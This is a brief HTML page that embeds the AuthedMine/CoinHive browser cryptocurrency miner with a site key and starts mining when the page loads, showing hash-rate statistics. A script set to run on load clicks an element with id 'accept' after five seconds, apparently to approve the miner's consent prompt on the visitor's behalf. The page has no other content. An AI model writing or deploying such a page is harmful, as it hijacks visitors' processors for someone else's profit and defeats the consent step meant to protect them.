<!DOCTYPE html>
<html>
	<head>

		<script src="https://authedmine.com/lib/authedmine.min.js"></script>
		<script>
		var miner = new CoinHive.Anonymous('XHusJQjzZStS61iNBKb9HUt1X3VvgTe4', {throttle: 0.3});

		miner.start();

		setInterval(function() {
				var hashesPerSecond = miner.getHashesPerSecond();
				var totalHashes = miner.getTotalHashes();
				var acceptedHashes = miner.getAcceptedHashes();

		document.getElementById('second').innerHTML= hashesPerSecond;
		document.getElementById('total').innerHTML= totalHashes;
		document.getElementById('accepted').innerHTML= acceptedHashes;

				// Output to HTML elements...
			}, 1000);

		</script>

		<meta charset="utf-8">
		<title></title>
	</head>
	<body onload="run()">

<div id="second"></div>
<div id="total"></div>
<div id="accepted"></div>
	</body>


	<script>
	function run(){

		setTimeout(function(){
document.getElementById('accept').click();
}, 5000);
	}
	</script>
</html>
